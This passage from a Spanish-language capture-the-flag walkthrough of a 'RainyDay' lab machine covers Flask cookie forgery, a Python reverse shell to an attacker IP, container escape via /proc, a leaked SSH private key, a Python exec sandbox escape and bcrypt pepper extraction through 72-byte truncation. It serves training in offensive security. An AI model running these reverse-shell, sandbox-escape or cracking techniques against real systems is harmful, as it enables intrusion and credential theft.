```

El contenido de la *cookie* es simplente el nombre de usuario.

Ahora vamos a forjar una *cookie* que nos permita **autenticarnos** como el usuario *jack*, empleando el **secreto** anterior:

```bash
flask-unsign --sign --cookie "{'username': 'jack'}" --secret "f77dd59f50ba412fcfbd3e653f8f3f2ca97224dd53cf6304b4c86658a75d8f67"
eyJ1c2VybmFtZSI6ImphY2sifQ.Y-5RCA.ZnfsnKZgbmmAMDx7C6U_O8_TGK0
```

Utilizaremos la cookie *eyJ1c2VybmFtZSI6ImphY2sifQ.Y-5RCA.ZnfsnKZgbmmAMDx7C6U_O8_TGK0* para ganar acceso a la *web* como *jack*.

Entrando en *My Containers*, tendremos acceso a *secrets*:

![imagen 40](Pasted image 20230216170033.png)

Vamos a ganar acceso al contenedor.

### Ganando acceso al contenedor secrets

Ya podemos cambiar el */etc/hosts* para que *dev.rainycloud.htb rainycloud.htb* apunten a la IP 10.10.11.184:

![imagen 41](Pasted image 20230216170528.png)

Tal como sucedió anteriormente, utilizaremos el siguiente **comando** para enviarnos una *reverse shell*:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.65",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Los valores `s.connect(("10.10.14.65",443))` **deben ser cambiados** dependiendo de nuestra IP y del puerto en el que queramos recibir la *shell*. 

Previamente a ejecutar el comando, nos ponemos en escucha con *netcat* a través del comando `sudo nc -nlvp 443`. Deberíamos recibir una consola:

![imagen 42](Pasted image 20230216170731.png)

Haremos un tratamiento a la consola para hacerla más interactiva. Esto significa poder hacer *Ctrl+C* sin perder la *shell*, limpiar los comandos, movernos con las flechas… Escribiremos la siguiente secuencia de comandos:

```bash
python3 -c 'import pty;pty.spawn("/bin/sh")'
*CTRL+Z*
stty raw -echo;fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Llevando a cabo un **reconocimiento básico del sistema**, no encuentra **nada interesante**. Es por eso que emplearé la herramienta *pspy* para ver qué tareas se están ejecutando a intervalos regulares de tiempo.

#### Reconocimiento del sistema con pspy

**_Pspy_** es una herramienta que nos permite ver qué tareas se están ejecutando a intervalos regulares de tiempo y por qué usuarios. Nos la podemos descargar del siguiente [repositorio](https://github.com/DominicBreuker/pspy).

El programa se puede transferir a la máquina víctima desplegando un servidor en _python_ `(python3 -m http.server 80)` compartiendo el fichero y luego en la máquina víctima en un directorio donde tengamos permisos de escritura (como _/tmp_ o _/dev/shm_) hacer un _wget_ para descargar el archivo.

Cada cierto tiempo se está ejecutando la siguiente tarea por el usuario con UID igual a 1000 (nosotros):

![imagen 43](Pasted image 20230217094729.png)

Simplemente se está ejecutando un ***sleep 100000000***. Un poco extraño, ya que esta cantidad de segundos equivale a 3,17 años. Vamos a inspeccionar el proceso que está corriendo este comando. Su PID (identificador) es **1196**. En */proc* encontraremos información sobre el mismo.

#### Ganando acceso a 10.10.11.184

El directorio */proc* es un directorio especial en los sistemas operativos tipo *Linux*, que proporciona información en tiempo real sobre los procesos. El proceso que nos interesa está en */proc/1196*. El directorio contiene la siguiente información:

```bash
/proc/1196 $ ls -la
total 0
dr-xr-xr-x    9 1000     1000             0 Feb 17 08:46 .
dr-xr-xr-x  281 root     root             0 Feb 17 06:25 ..
-r--r--r--    1 1000     1000             0 Feb 17 08:51 arch_status
dr-xr-xr-x    2 1000     1000             0 Feb 17 08:51 attr
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 autogroup
-r--------    1 1000     1000             0 Feb 17 08:51 auxv
-r--r--r--    1 1000     1000             0 Feb 17 08:51 cgroup
--w-------    1 1000     1000             0 Feb 17 08:51 clear_refs
-r--r--r--    1 1000     1000             0 Feb 17 08:46 cmdline
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 comm
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 coredump_filter
-r--r--r--    1 1000     1000             0 Feb 17 08:51 cpu_resctrl_groups
-r--r--r--    1 1000     1000             0 Feb 17 08:51 cpuset
lrwxrwxrwx    1 1000     1000             0 Feb 17 08:51 cwd -> /home/jack
-r--------    1 1000     1000             0 Feb 17 08:51 environ
lrwxrwxrwx    1 1000     1000             0 Feb 17 08:51 exe -> /usr/bin/sleep
dr-x------    2 1000     1000             0 Feb 17 08:51 fd
dr-xr-xr-x    2 1000     1000             0 Feb 17 08:51 fdinfo
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 gid_map
-r--------    1 1000     1000             0 Feb 17 08:51 io
-r--r--r--    1 1000     1000             0 Feb 17 08:51 limits
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 loginuid
dr-x------    2 1000     1000             0 Feb 17 08:51 map_files
-r--r--r--    1 1000     1000             0 Feb 17 08:51 maps
-rw-------    1 1000     1000             0 Feb 17 08:51 mem
-r--r--r--    1 1000     1000             0 Feb 17 08:51 mountinfo
-r--r--r--    1 1000     1000             0 Feb 17 08:51 mounts
-r--------    1 1000     1000             0 Feb 17 08:51 mountstats
dr-xr-xr-x   54 1000     1000             0 Feb 17 08:51 net
dr-x--x--x    2 1000     1000             0 Feb 17 08:51 ns
-r--r--r--    1 1000     1000             0 Feb 17 08:51 numa_maps
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 oom_adj
-r--r--r--    1 1000     1000             0 Feb 17 08:51 oom_score
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 oom_score_adj
-r--------    1 1000     1000             0 Feb 17 08:51 pagemap
-r--------    1 1000     1000             0 Feb 17 08:51 patch_state
-r--------    1 1000     1000             0 Feb 17 08:51 personality
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 projid_map
lrwxrwxrwx    1 1000     1000             0 Feb 17 08:51 root -> /
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 sched
-r--r--r--    1 1000     1000             0 Feb 17 08:51 schedstat
-r--r--r--    1 1000     1000             0 Feb 17 08:51 sessionid
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 setgroups
-r--r--r--    1 1000     1000             0 Feb 17 08:51 smaps
-r--r--r--    1 1000     1000             0 Feb 17 08:51 smaps_rollup
-r--------    1 1000     1000             0 Feb 17 08:51 stack
-r--r--r--    1 1000     1000             0 Feb 17 08:51 stat
-r--r--r--    1 1000     1000             0 Feb 17 08:51 statm
-r--r--r--    1 1000     1000             0 Feb 17 08:51 status
-r--------    1 1000     1000             0 Feb 17 08:51 syscall
dr-xr-xr-x    3 1000     1000             0 Feb 17 08:51 task
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 timens_offsets
-r--r--r--    1 1000     1000             0 Feb 17 08:51 timers
-rw-rw-rw-    1 1000     1000             0 Feb 17 08:51 timerslack_ns
-rw-r--r--    1 1000     1000             0 Feb 17 08:51 uid_map
-r--r--r--    1 1000     1000             0 Feb 17 08:51 wchan
```

La carpeta */root* es un **enlace simbólico a la raiz del sistema**. Si accedemos a la carpeta:

![imagen 44](Pasted image 20230217095843.png)

Nos encontramos en la **raiz del sistema**, no la del contenedor, sino la del sistema víctima, la *10.10.11.184*. En el directorio *home/jack/.ssh/id_rsa* encontraremos la clave privada RSA del usuario *jack*:

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA7Ce/LAvrYP84rAa7QU51Y+HxWRC5qmmVX4wwiCuQlDqz73uvRkXq
qdDbDtTCnJUVwNJIFr4wIMrXAOvEp0PTaUY5xyk3KW4x9S1Gqu8sV1rft3Fb7rY1RxzUow
SjS+Ew+ws4cpAdl/BvrCrw9WFwEq7QcskUCON145N06NJqPgqJ7Z15Z63NMbKWRhvIoPRO
JDhAaulvxjKdJr7AqKAnt+pIJYDkDeAfYuPYghJN/neeRPan3ue3iExiLdk7OA/8PkEVF0
/pLldRcUB09RUIoMPm8CR7ES/58p9MMHIHYWztcMtjz7mAfTcbwczq5YX3eNbHo9YFpo95
MqTueSxiSKsOQjPIpWPJ9LVHFyCEOW5ONR/NeWjxCEsaIz2NzFtPq5tcaLZbdhKnyaHE6k
m2eS8i8uVlMbY/XnUpRR1PKvWZwiqlzb4F89AkqnFooztdubdFbozV0vM7UhqKxtmMAtnu
a20uKD7bZV8W/rWvl5UpZ2A+0UEGicsAecT4kUghAAAFiHftftN37X7TAAAAB3NzaC1yc2
EAAAGBAOwnvywL62D/OKwGu0FOdWPh8VkQuapplV+MMIgrkJQ6s+97r0ZF6qnQ2w7UwpyV
FcDSSBa+MCDK1wDrxKdD02lGOccpNyluMfUtRqrvLFda37dxW+62NUcc1KMEo0vhMPsLOH
KQHZfwb6wq8PVhcBKu0HLJFAjjdeOTdOjSaj4Kie2deWetzTGylkYbyKD0TiQ4QGrpb8Yy
nSa+wKigJ7fqSCWA5A3gH2Lj2IISTf53nkT2p97nt4hMYi3ZOzgP/D5BFRdP6S5XUXFAdP
UVCKDD5vAkexEv+fKfTDByB2Fs7XDLY8+5gH03G8HM6uWF93jWx6PWBaaPeTKk7nksYkir
DkIzyKVjyfS1RxcghDluTjUfzXlo8QhLGiM9jcxbT6ubXGi2W3YSp8mhxOpJtnkvIvLlZT
G2P151KUUdTyr1mcIqpc2+BfPQJKpxaKM7Xbm3RW6M1dLzO1IaisbZjALZ7mttLig+22Vf
Fv61r5eVKWdgPtFBBonLAHnE+JFIIQAAAAMBAAEAAAGAB0Sd5JwlTWHte5Xlc3gXstBEXk
pefHktaLhm0foNRBKecRNsbIxAUaOk6krwBmOsPLf8Ef8eehPkFBotfjxfKFFJ+/Avy22h
yfrvvtkHk1Svp/SsMKeY8ixX+wBsiixPFprczOHUl1WGClVz/wlVqq2Iqs+3dyKRAUULhx
LaxDgM0KxVDTTTKOFnMJcwUIvUT9cPXHr8vqvWHFgok8gCEO379HOIEUlBjgiXJEGt9tP1
oge5WOnmwyIer2yNHweW26xyaSgZjZWP6z9Il1Gab0ZXRu1sZYadcEXZcOQT6frZhlF/Dx
pmgbdtejlRcUaI86mrwPFAP1PClLMlilroEaHCl8Dln5HEqnkpoNaJyg8di1pud+rJwlQw
ZyL6xnJ0Ke4ul3fDWpYnO/t8q5DQgnIhRKwyDGSM7M6DqBXi8CHSbPITzOMaiWgNzue49D
7ejAWa2sSlHJYhS0Uxpa7xQ3LslsnnysxIsZHKwmaMerKMGRmpoV2h5/VnXVeiEMIxAAAA
wQCoxMsk1JPEelb6bcWIBcJ0AuU5f16fjlYZMRLP75x/el1/KYo3J9gk+9BMw9AcZasX7Q
LOsbVdL45y14IIe6hROnj/3b8QPsmyEwGc13MYC0jgKN7ggUxkp4BPH4EPbPfouRkj7WWL
UwVjOxsPTXt2taMn5blhEF2+YwH5hyrVS2kW4CPYHeVMa1+RZl5/xObp/A62X/CWHY9CMI
nY9sRDI415LvIgofRqEdYgCdC6UaE/MSuDiuI0QcsyGucQlMQAAADBAPFAnhZPosUFnmb9
Plv7lbz9bAkvdcCHC46RIrJzJxWo5EqizlEREcw/qerre36UFYRIS7708Q9FELDV9dkodP
3xAPNuM9OCrD0MLBiReWq9WDEcmRPdc2nWM5RRDqcBPJy5+gsDTVANerpOznu7I9t5Jt+6
9Stx6TypwWshB+4pqECgiUfR8H1UNwSClU8QLVmDmXJmYScD/jTU4z3yHRaVzGinxOwDVG
PITC9yJXJgWTSFQC8UUjrqI7cRoFtI9QAAAMEA+pddCQ8pYvVdI36BiDG41rsdM0ZWCxsJ
sXDQ7yS5MmlZmIMH5s1J/wgL90V9y7keubaJxw1aEgXBa6HBuz8lMiAx7DgEMospHBO00p
92XFjtlFMwCX6V+RW+aO0D+mxmhgP3q3UDcVjW/Xar7CW57beLRFoyAyUS0YZNP7USkBZg
FXc7fxSlEqYqctfe4fZKBxV68i/c+LDvg8MwoA5HJZxWl7a9zWux7JXcrloll6+Sbsro7S
bU2hJSEWRZDLb9AAAADWphY2tAcmFpbnlkYXkBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

La utilizaremos para **conectarnos por SSH** con el comando `ssh -i id_rsa_jack jack@10.10.11.184` (recordemos que debemos asignarle **permisos 600** al archivo que contiene la clave):

![imagen 45](Pasted image 20230217100345.png)

### user.txt

Encontraremos la primera *flag* en el *homedir* del usuario *jack*:

```bash
jack@rainyday:~$ cat user.txt 
2b7bcbb92d3837e8af26085bb2271c6b
```

## Consiguiendo shell como jack_adm

### Reconocimiento del sistema

#### sudoers

El usuario *jack* tiene asignado el siguiente privilegio a nivel de ***sudoers***:

```bash
jack@rainyday:/tmp$ sudo -l
Matching Defaults entries for jack on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on localhost:
    (jack_adm) NOPASSWD: /usr/bin/safe_python *
```

Como *jack_adm* podemos ejecutar el binario */usr/bin/safe_python*, pasándole cualquier fichero o comando como parámetro.

Vamos a crear una archivo *test* con cualquier contenido en su interior para entender como funciona el binario. La respuesta es la siguiente:

![imagen 46](Pasted image 20230217101913.png)

El *script* está utilizando la función ***exec()***.

La función `exec()` en *Python* es una función integrada que se utiliza para ejecutar código Python dinámicamente en tiempo de ejecución. En nuestro caso, la función `exec()` toma dos cadenas de texto. La primera cadena es el contenido del archivo que pasamos como parámetro, mientras que la segunda es un diccionario opcional que contiene el espacio de nombres global y local en el que se ejecutará el código.

Vamos a hacer una prueba creando un archivo *pwned* con el contenido `__import__('os').system('echo "Hi" > /tmp/jack_adm')`. Si se ejecuta el código anterior, *jack_adm* se debería crear un archivo en */tmp/* con el contenido *Hi*.

![imagen 47](Pasted image 20230217103005.png)

Nos salta el error *_\_import_\_ is not defined*. Es posible que el parámetro `env` de la función `exec()` esté provocando que la función `__import__()` no esté definida en el espacio de nombres local. 

Vamos a intentar obtener el contenido de */usr/bin/safe_python*. Modificaremos nuestro archivo *pwned* con estas líneas:

```python
with open('/usr/bin/safe_python', 'r') as f:
    print(f.read())
```

Nosotros, siendo *jack*, no podemos visualizar el contenido de *safe_python*, pero, como el código va a ser ejecutado por *jack_adm*, deberíamos obtener la respuesta esperada.

El contenido de *safe_python* es el siguiente:

```python
#!/usr/bin/python3

import os,sys

SAFE_FUNCTIONS = ["open", "print", "len", "id", "int", "bytearray", "range", "hex", "str"]
DANGEROUS_DEFAULTS = ["__import__", "__doc__", "__package__", "__loader__", "__spec__", "__name__"]

env = {}
env["locals"]   = None
env["globals"]  = None #{"__builtins__": {"open": open, "os": os}}
env["__name__"] = None
env["__file__"] = None
env["__builtins__"] = None
my_builtins = __builtins__.__dict__.copy()

for a in __builtins__.__dict__:
	if a in DANGEROUS_DEFAULTS:
		del my_builtins[a]
		continue

	if a.startswith("__") or a.lower() in SAFE_FUNCTIONS:
		continue

	del my_builtins[a]

env['__builtins__'] = my_builtins

with open(sys.argv[1]) as f:
	exec(f.read(), env)
```

Este código crea en primer lugar un **entorno de ejecución seguro** al eliminar los nombres de función peligrosos y **solo permitir un conjunto específico de funciones consideradas seguras**.

La lista de funciones seguras está dada por `SAFE_FUNCTIONS`, que contiene los nombres de funciones que se permiten en el **entorno seguro**. Estos nombres de función son considerados seguros porque no tienen un potencial riesgo de seguridad.

Por otro lado, la lista de `DANGEROUS_DEFAULTS` contiene los nombres de función que se consideran **peligrosos** y se deben eliminar del entorno seguro.

El código copia el diccionario de `__builtins__.__dict__` en la variable `my_builtins`, y luego itera a través de él. Si el nombre de la función se encuentra en la lista de `DANGEROUS_DEFAULTS`, se elimina del diccionario de `my_builtins`. Si el nombre de la función comienza con `__` o no está en la lista de `SAFE_FUNCTIONS`, también se elimina del diccionario de `my_builtins`.

Al final, se establece el diccionario modificado `my_builtins` como el diccionario `__builtins__` del entorno seguro. Con esto, el entorno solo permite las funciones consideradas seguras y evita que se ejecuten funciones peligrosas que puedan comprometer la seguridad del sistema.

Por estas razones no podíamos utilizar `__import__` anteriormente, ya que forma parte de las **funciones peligrosas**.

### Rompiendo protecciones Python exec

El proceso de explotación está extraído del siguiente [enlace](https://netsec.expert/posts/breaking-python3-eval-protections/). 

En *Python*, casi todo es un objeto que hereda de una clase base llamada *object*. Esto incluye módulos, variables, tipos de variables y funciones. También es posible declarar tipos de variables implícitamente como `list() = []`, `dict() = {}`, `str() = ""`. Es posible **explorar la herencia de los objetos en Python** para encontrar los *built-ins* no eliminados o los módulos que se pueden usar para importar más código, incluso sin tener acceso a los globales o locales.

Utilizaremos la clase *BuiltinImporter* de la lista de subclases, la instanciaremos e importaremos un módulo, en nuestro caso *os*. El comando de sistema que ejecutaremos será una *bash*:

```bash
## Trying to do anything up here would fail since the builtins are cleared.
for some_class in [].__class__.__base__.__subclasses__():
    if some_class.__name__ == 'BuiltinImporter':
        some_class().load_module('os').system('bash')
```

Ejecutaremos */usr/bin/safe_python* pasándole un archivo con el contenido anterior y deberíamos ganar una consola como *jack_adm*:

```bash
jack@rainyday:/tmp$ sudo -u jack_adm /usr/bin/safe_python pwned
jack_adm@rainyday:/tmp$ whoami
jack_adm
```


## Consiguiendo shell como root

### Reconocimiento del sistema

#### sudoers

*jack_adm* tiene asignado el siguiente privilegio a nivel de *sudoers*:

```bash
jack_adm@rainyday:/tmp$ sudo -l
Matching Defaults entries for jack_adm on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack_adm may run the following commands on localhost:
    (root) NOPASSWD: /opt/hash_system/hash_password.py
```

Podemos ejecutar como el usuario *root*, sin proporcionar contraseña, el binario */opt/hash_system/hash_password.py*.

Como su propio nombre indica, *hash_password.py* *hashea* una contraseña en *bcrypt*:

![imagen 48](Pasted image 20230217120308.png)

La **contraseña** debe tener una longitud **comprendida entre 0 (sin incluir) y 30 (incluido)**. 

Sabiendo que:

* Poseemos el ***hash* de *root*** (lo encontramos al principio de la máquina).
* Seguramente se le haya añadido una **extensión** (secreto o *pepper*) a la contraseña de *root*. (Recordemos que nos fue imposible encontrar la contraseña de *root* cuando hicimos el ataque por fuerza bruta al inicio). 
* La **longitud máxima** de contraseña que admite *brcrypt* son **72 bytes** (si se supera el límite, el algoritmo truncará la contraseña).
* Existen **caracteres de 4 *bytes***.

Podemos obtener esta extensión que se le está concatenando a la contraseña, posteriormente crear un diccionario de contraseñas que contemplen este secreto y finalmente volver a *crackear* el *hash* de *root*. Con un poco de suerte, **conseguiremos su contraseña y podremos escalar privilegios**.

#### Obteniendo secreto (pepper)

##### Contexto

Como he comentado anteriormente, la longitud máxima de contraseña que admite *bcrypt* son **72 *bytes***. Imaginemos que para generar el *hash* de *root* se ha utilizado el siguiente código:

```python
import bcrypt

## Define la contraseña y el pepper
password = 'password' ## Contraseña 
pepper = 'my_super_secret_pepper' ## Pepper de ejemplo

## Concatena la contraseña y el pepper
password_with_pepper = password + pepper

## Genera el hash en bcrypt utilizando la contraseña concatenada y un factor de trabajo de 12
hashed_password = bcrypt.hashpw(password_with_pepper.encode('utf-8'), bcrypt.gensalt(12))
```

Y que */opt/hash_system/hash_password.py* también utiliza este código para generar el *hash* de cualquier contraseña.

La longitud de `password + pepper` debe ser como máximo **72B**. Si escribimos una contraseña de **71B**, aparte de la contraseña, solo cabrá la primera letra del *pepper*, en este caso *m* (*y_super_secret_pepper* será truncado). 

Dicho esto:

* Si generamos un *hash* con estas características.
* Creamos un diccionario de contraseñas con todas las posibles combinaciones de contraseña más una letra (son menos de 256 combinaciones).
* Lanzamos un ataque de fuerza bruta empleando este diccionario.

Conseguiremos la primera letra del *pepper*. Para la siguiente letra, se hará lo mismo, pero en lugar de generar un *hash* a partir de una contraseña de *71B*, será de *70B*. El *byte* 71 ya sabremos cuál es (primera letra *pepper*) y el 72 es la nueva letra del *pepper* que queremos descubrir.

Ahora bien, todo este proceso tiene un pequeño **inconveniente**. Recordemos que *hash_password.py* no nos deja escribir contraseñas más largar de 30 caracteres. Uno pensaría que entonces es imposible escribir una contraseña de 71B, ya que un carácter suele ocupar 1B. Pues **existen caracteres que ocupan 4B**. Dejo [este](https://design215.com/toolbox/utf8-4byte-characters.php) enlace.

##### Explotación

El siguiente *payload* tiene un tamaño de **71B**:

```bash
𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐aaaaaaa
```

Generamos un *hash*:

```bash
Enter Password> 𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐aaaaaaa
[+] Hash: $2b$05$5SXlDzfk4XEuJPFNler0pOtsVqNCHoHtoxjTMHapp.MV3VD3eClbC
```

El *hash* está **compuesto** por la **contraseña anterior** y **una letra del secreto**.

El siguiente *script* de *python* tiene como objetivo generar una lista de posibles contraseñas al concatenar una contraseña con cada carácter.  Luego, escribe esta lista de posibles contraseñas en un archivo de texto llamado `dictionary.txt`:

```python
#!/usr/bin/python

import string

dictionary_file = "dictionary.txt"

chars = string.ascii_letters + string.digits + string.punctuation

password = input("Introduce la contraseña: ")

with open(dictionary_file, "w") as f:
    for char in chars:
        f.write(f"{password}{char}\n")
```

Ejecutamos:

```bash
$> python3 create_dictionary.py
Introduce la contraseña: 𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐aaaaaaa
```

Procedemos a *crackear* el *hash* con *john* empleando el diccionario que hemos generado con el *script* anterior:

![imagen 49](Pasted image 20230217124635.png)

* *dictionary.txt* es el diccionario creado anteriormente.
* *hash* contiene el *hash* generado por *hash_password.py* 

La primera letra del *pepper* es una ***H***.

El siguiente *payload* de **70B** será:

```bash
𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐aaaaaa
```

Generamos un *hash*:

```bash
Enter Password> 𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐aaaaaa
[+] Hash: $2b$05$lIN9o3lswgHHjxBDmLVCiuXMF8kdoyt6MPmQaocF9jJbhRNISMeuq
```

Este *hash* contiene dos letras del *pepper*. La primera la sabemos, *H*, la segunda es la que necesitamos descubrir. Generamos un diccionario con todas las posibles combinaciones:

```bash
$> python3 create_dictionary.py
Introduce la contraseña: 𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐𒀐aaaaaaH
```

Y *crackeamos* el *hash* anterior con *john*:

![imagen 50](Pasted image 20230217135617.png)

La siguiente letra es *3*.

Y así sucesivamente hasta extraer completamente el valor del *pepper*, ***H34vyR41n***. En el *Anexo*, dejo el código de *hash_password.py*.

#### Obteniendo contraseña de root

Estamos suponiendo que el *hash* que conseguimos de *root* en el inicio de la resolución de la máquina, `$2a$05$FESATmlY4G7zlxoXBKLxA.kYpZx8rLXb2lMjz3SInN4vbkK82na5W`, surge de la concatenación de su contraseña y de un secreto o *pepper*. 

Vamos a **modificar** el *rockyou.txt* para concatenar a cada contraseña el valor *H34vyR41n*:

```bash
cat rockyou.txt | sed 's/$/H34vyR41n/g' > rockyou_modified
```

Utilizaremos *john* para *crackear* el *hash* utilizando el diccionario anterior:
 
![imagen 51](Pasted image 20230217140330.png)

Y obtenemos la contraseña: `246813579H34vyR41n`

Finalmente, nos autenticamos como *root*:

![imagen 52](Pasted image 20230217140435.png)


### root.txt

La última *flag* se encuentra en el *homedir* del usuario *root*:

```bash
root@rainyday:~## cat root.txt 
a3cdfcc40021603153cea6c703b7c146
```


## Anexo

### Código de hash_password.py 

Código fuente del binario *hash_password.py*. **Solo accesible siendo *root***: 

```python
#!/usr/bin/python3

import bcrypt
from config import SECRET

while True:
	user_input = input("Enter Password> ")
	if len(user_input) > 30 or len(user_input)==0:
		print("[+] Invalid Input Length! Must be <= 30 and >0")
	else:
		data = (user_input + SECRET).encode()
		hashed = bcrypt.hashpw(data, bcrypt.gensalt(rounds=5))
		print(f"[+] Hash: {hashed.decode()}")
		break
```

```bash
root@rainyday:/opt/hash_system## cat config.py 
SECRET='H34vyR41n'
```







